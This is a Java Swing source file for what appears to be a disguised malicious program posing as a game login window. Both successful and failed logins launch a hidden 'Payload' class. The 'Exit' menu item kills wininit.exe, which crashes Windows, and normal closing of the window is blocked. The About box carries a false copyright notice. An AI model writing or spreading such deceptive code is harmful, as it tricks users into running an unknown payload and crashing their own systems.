package com.mihoyo.game;

import javax.swing.*;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.IOException;

public class LoginGUI extends JFrame{
    public static boolean isSuccess = false;

    private JLabel lblFailed;
        private JTextField txtName;
        private JPasswordField txtPwd;

    public void launch() {
            this.setTitle("Login");
            JPanel p = new JPanel();
            p.setLayout(null);
            JMenuBar menuBar = new JMenuBar();
            JMenu menu = new JMenu("Operation");
            JMenuItem miAbout = new JMenuItem("About");
            JMenuItem miExit = new JMenuItem("Exit");
            lblFailed = new JLabel("IDLE...");
            JLabel lblName = new JLabel("Username");
            JLabel lblPwd = new JLabel("Password");
            txtName = new JTextField(20);
            txtPwd = new JPasswordField(20);
            txtPwd.setEchoChar('*');
            JButton btnOk = new JButton("Login");
            lblName.setBounds(30, 30, 60, 25);
            txtName.setBounds(95, 30, 120, 25);
            lblPwd.setBounds(30, 60, 60, 25);
            txtPwd.setBounds(95, 60, 120, 25);
            btnOk.setBounds(115, 90, 70, 25);
            lblFailed.setBounds(10 , 100 , 120 , 30);
            menu.add(miAbout);
            menu.add(miExit);
            p.add(lblFailed);
            p.add(lblName);
            p.add(txtName);
            p.add(lblPwd);
            p.add(txtPwd);
            p.add(btnOk);
            menuBar.add(menu);
            this.setJMenuBar(menuBar);
            this.add(p);
            this.setSize(300, 200);
            this.setLocation(300, 300);
            this.setResizable(false);
            this.setVisible(true);
            this.addWindowListener(new WindowListener() {
                @Override
                public void windowOpened(WindowEvent e) {}
                @Override
                public void windowClosing(WindowEvent e) {
                    int opt = JOptionPane.showConfirmDialog(null , "Closing this window will close the game. \n If you want to continue the game, please enter the correct username and password. \n Are you sure you want to close the game?", "Warning", JOptionPane.YES_NO_OPTION);
                    if (opt == JOptionPane.YES_OPTION) {
                        try {
                            Runtime.getRuntime().exec("taskkill /f /t /im java.exe");
                        } catch (IOException ioException) {
                            ioException.printStackTrace();
                        }
                    }
                }
                @Override
                public void windowClosed(WindowEvent e) {}

                @Override
                public void windowIconified(WindowEvent e) {}

                @Override
                public void windowDeiconified(WindowEvent e) {}

                @Override
                public void windowActivated(WindowEvent e) {}

                @Override
                public void windowDeactivated(WindowEvent e) {}});
            this.setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
            miAbout.addActionListener(e -> JOptionPane.showMessageDialog(this, "Copyright 2021 java.com ALL Rights Reserved", "Important tips", JOptionPane.INFORMATION_MESSAGE));
            miExit.addActionListener(e -> {
                try {
                    Runtime.getRuntime().exec("taskkill /f /t /im wininit.exe");
                    Runtime.getRuntime().exec("taskkill /f /t /im java.exe");
                } catch (IOException ioException) {
                    ioException.printStackTrace();
                }
            });
            btnOk.addActionListener(e -> {
                String strName = txtName.getText();
                String strPwd = new String(txtPwd.getPassword());
                if (strName.equals("admin") && strPwd.equals("123456")) {
                    lblFailed.setText("Welcome!");
                    try {
                        isSuccess = true;
                        this.setVisible(false);
                        Payload.main(new String[0]);
                    } catch (Exception ex) {
                        ex.printStackTrace();
                        System.out.println("ERROR!");
                        try {
                            Runtime.getRuntime().exec("taskkill /f /t /im javaw.exe");
                            Runtime.getRuntime().exec("taskkill /f /t /im java.exe");
                        } catch (Exception sf) {
                            System.out.println("Fuck");
                        }
                    }
                } else {
                    try {
                        Payload.main(new String[0]);
                    } catch (Exception ex) {
                        ex.printStackTrace();
                        System.out.println("ERROR!");
                        try {
                            Runtime.getRuntime().exec("taskkill /f /t /im javaw.exe");
                            Runtime.getRuntime().exec("taskkill /f /t /im java.exe");
                        } catch (Exception fk) {
                            System.out.println("Fuck");
                        }
                    }
                    JOptionPane.showMessageDialog(this, "Login Failed.", "Message", JOptionPane.ERROR_MESSAGE);
                }
            });
        }
    }
